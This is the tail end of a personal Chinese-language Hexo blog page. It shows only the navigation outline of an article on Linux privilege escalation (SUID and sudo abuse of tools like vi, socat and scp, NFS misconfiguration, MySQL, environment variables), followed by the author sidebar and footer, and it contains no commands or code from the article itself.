class="nav-text">man</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#vi"><span class="nav-number">1.2.3.3.7.</span> <span class="nav-text">*vi</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-number">1.2.3.3.8.</span> <span class="nav-text">脚本</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="nav-number">1.2.3.4.</span> <span class="nav-text">应用程序</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#env"><span class="nav-number">1.2.3.4.1.</span> <span class="nav-text">env</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#ftp"><span class="nav-number">1.2.3.4.2.</span> <span class="nav-text">ftp</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#socat"><span class="nav-number">1.2.3.4.3.</span> <span class="nav-text">socat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#scp"><span class="nav-number">1.2.3.4.4.</span> <span class="nav-text">scp</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E6%83%85%E5%86%B5"><span class="nav-number">1.2.3.5.</span> <span class="nav-text">黑名单情况</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-NFS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.</span> <span class="nav-text">3) NFS配置不当导致提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NFS%E4%BB%8B%E7%BB%8D"><span class="nav-number">1.3.1.</span> <span class="nav-text">NFS介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NFS%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%8F%AF%E6%8F%90%E6%9D%83"><span class="nav-number">1.3.2.</span> <span class="nav-text">NFS配置不当可提权</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E5%AE%83%E5%91%BD%E4%BB%A4"><span class="nav-number">1.3.3.</span> <span class="nav-text">其它命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4%EF%BC%89Mysql%E6%8F%90%E6%9D%83"><span class="nav-number">1.4.</span> <span class="nav-text">4）Mysql提权</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E9%80%9A%E8%BF%87mysql%E6%97%A5%E5%BF%97%E5%8A%9F%E8%83%BD"><span class="nav-number">1.4.1.</span> <span class="nav-text">1、通过mysql日志功能</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5%EF%BC%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="nav-number">1.5.</span> <span class="nav-text">5）环境变量提权</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ps"><span class="nav-number">1.6.</span> <span class="nav-text">ps</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E5%B8%B8%E8%A7%81%E7%9A%84%E6%95%8F%E6%84%9F%E6%96%87%E4%BB%B6"><span class="nav-number">1.6.1.</span> <span class="nav-text">linux常见的敏感文件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%8E%A2%E6%B5%8B%E6%96%87%E4%BB%B6"><span class="nav-number">1.6.1.1.</span> <span class="nav-text">内网探测文件</span></a></li></ol></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Ttoc"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Ttoc</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">51</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">16</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/try-to-change" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;try-to-change" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:wejoke3@gmail.com" title="E-Mail → mailto:wejoke3@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2022 – 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Ttoc</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

<script async>window.onload=function(){var a=document.createElement('script'),b=document.getElementsByTagName('script')[0];a.type='text/javascript',a.async=!0,a.src='/sw-register.js?v='+Date.now(),b.parentNode.insertBefore(a,b)};</script></body></html>